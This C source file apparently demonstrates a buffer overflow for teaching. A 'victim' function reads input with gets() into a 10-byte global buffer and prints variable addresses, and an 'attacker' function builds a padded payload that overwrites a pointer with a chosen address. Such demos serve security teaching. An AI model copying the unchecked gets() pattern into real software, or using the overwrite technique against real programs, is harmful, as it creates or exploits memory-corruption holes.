#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char input[10];
char * message;

void do_something(void);
void victim(void);
void attacker(char * address);

void victim(void) {
  int space1 = 0;
  int authorized = 1;
  int space2 = 0;
  message = malloc(sizeof(char) * 100);

  printf("input: %p\n", &input);
  printf("message: %p\n", &message);
  printf("message buffer: %p\n", message);
  printf("authorized: %p\n", &authorized);
  printf("space1: %p\n", &space1);
  printf("space2: %p\n", &space2);
  
  gets(input);
  printf("message buffer: %p\n", message);
  if (strcmp(input, "pwd") !=0) {
    authorized = 0;
    strcpy(message, "Fail");
  }
  printf("authorized: %d\n", authorized);
  if (authorized)
    do_something();
  else
    printf("%s\n", message);
  printf("END\n");
}


void attacker(char * address) {
  int dst = ((int) &message) - ((int) &input);
  char * buffer = malloc(dst + 4 + 1);
  int i;
  for (i=0; i<dst; i++) {
    buffer[i] = 'A';
  }
  *(void **)(&buffer[dst]) = (void *)strtoul(address, NULL, 0);
  buffer[dst+4] = 0;
  printf("%s\n", buffer);
}

int main(int argc, char *argv[])
{
  if (strcmp(argv[1], "victim") == 0)
    victim();
  else
    attacker(argv[2]);
  
  return 0;
}

void do_something(void) {
  printf("I've done something\n");
}
